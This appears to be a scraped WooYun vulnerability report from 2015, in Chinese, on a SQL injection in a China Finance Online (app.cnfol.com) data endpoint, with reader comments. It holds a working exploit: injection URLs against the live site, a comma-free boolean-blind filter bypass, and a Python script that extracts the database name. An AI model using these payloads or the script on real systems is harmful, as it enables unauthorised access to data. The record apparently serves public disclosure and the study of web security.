{"id": 5212, "wybug_id": "wooyun-2015-0141577", "wybug_title": "中金在线某站伪静态页面SQL注入", "wybug_corp": "福建中金在线网络股份有限公司", "wybug_author": "渔村安全实验室", "wybug_date": "2015-09-16 16:04", "wybug_open_date": "2015-09-21 16:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  \nhttp://app.cnfol.com/dataapi/index.php/welcome/hkthpj/205/6/1/id/asc/point_1+/point_2/\npoint_1与point_2可以从这两个参数下手\n\n既然有SQL的错误信息，尝试报错注入\nhttp://app.cnfol.com/dataapi/index.php/welcome/hkthpj/205/6/1/id/asc/1 = 1+AND (SELECT 4482 FROM(SELECT COUNT(*),CONCAT(0x4f784e54,(SELECT (ELT(4482=4482,1))),0x7a794758,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)/point_2/\n\n\n从返回信息可以看到，过滤了逗号，会把逗号替换成and，换个思路，换成布尔类型注入\n\n\n\n由此判断可以利用布尔类型注入，但要绕过他的检测，payload中不能使用逗号先猜解出database的长度,长度为8\nhttp://app.cnfol.com/dataapi/index.php/welcome/hkthpj/205/6/1/id/asc/ 1=(SELECT LENGTH(database()) =8)+\n写个脚本猜解下\nimport requestsimport osuser_len = 8url = u'http://app.cnfol.com/dataapi/index.php/welcome/hkthpj/205/6/1/id/asc/(ascii(mid(%s from(%d)for(1)))<%d)+'index = 1temp = ''print 'fetching database start:'while index <= user_len:    test_num = 200    while test_num:        oper = requests.get(url % (u'database()', index, test_num))        if oper.status_code is 200:            if len(oper.content) < 13972:                temp += chr(test_num)                print temp                break            test_num -= 1    index += 1print 'database:%s\\n' % tempos.system('pause')\n\n\n   漏洞证明：     修复方案：  你比我懂   版权声明：转载请注明来源 渔村安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-21 16:06 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-21 19:00 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  思路挺溜的，学习咯~    \n     2015-09-22 23:05 |    \t\t心云 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 学好技术,读好书，做好人。)\t\t \n  忽略。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}